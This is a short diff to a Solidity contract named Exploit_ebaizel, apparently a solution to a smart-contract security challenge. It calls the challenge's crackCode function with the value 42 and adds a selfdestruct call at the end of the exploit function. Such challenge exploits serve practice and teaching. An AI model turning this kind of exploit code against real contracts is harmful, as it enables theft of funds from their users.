@@ -18,6 +18,8 @@ contract Exploit_ebaizel {
         uint8 ff = 0xff;
         address(this).call(abi.encodePacked(abi.encodeWithSelector(IChallenge_ebaizel.crackCode.selector, uint8(42))));
         instance.crackCode(42);
+
+        selfdestruct(payable(address(this)));
     }
 
     function foo(uint8) external {
